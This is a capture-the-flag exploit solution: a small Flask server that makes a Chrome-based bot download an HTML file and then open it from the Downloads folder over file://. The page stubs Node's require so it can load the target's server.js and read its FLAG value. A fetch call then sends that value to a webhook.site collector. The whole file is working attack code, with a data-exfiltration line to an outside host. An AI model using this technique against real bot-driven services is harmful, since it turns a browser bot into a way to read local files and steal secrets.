```
from flask import Flask
app = Flask(__name__)

@app.route('/index.html')
def hello_world():
    r = """
    <html>
    <head>
        <script>
            function require(a){
                if(a=="express"){return ()=>{return {get:function(){},listen:function(){}}}
                }
                if(a=="redis"){
                    return {createClient:function(){}}
                }
                if(a=="fs"){
                    return {existsSync:function(){}};
                }
            }

        </script>
        <script src="../app/server.js">
        </script>
        <script>
            fetch("https://webhook.site/X?a="+FLAG);
        </script>
    </head>
    </html>
    """

    return r,{"Content-Disposition":'attachment; filename="wtf22.html"'}

if(__name__=="__main__"):
    app.run("0.0.0.0",4000)
    
#How to solve:
# 1. Host this somewhere
# 2. Enter url of `index.html` to the bot, Then chrome will download file as wtf22.html and will save it in Downloads folder.
# 3. Then send this url of saved file to bot: "file:///home/user/Downloads/wtf22.html"
# 4. Flag will be sent to https://webhook.site/X
